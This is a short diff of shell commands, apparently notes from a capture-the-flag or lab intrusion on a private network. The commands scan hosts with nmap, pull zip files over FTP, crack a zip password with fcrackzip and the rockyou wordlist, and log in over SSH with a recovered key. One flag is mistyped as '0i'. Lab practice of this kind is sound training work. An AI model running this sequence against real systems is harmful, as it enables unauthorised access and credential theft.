@@ -1,0 +1,6 @@
+nmap -sV -sP 10.0.0.12/24
+nmap -sV 10.0.0.60
+ftp 10.0.0.60
+mget *.zip
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt tom.zip
+ssh tom@10.0.0.60 0i id_rsa
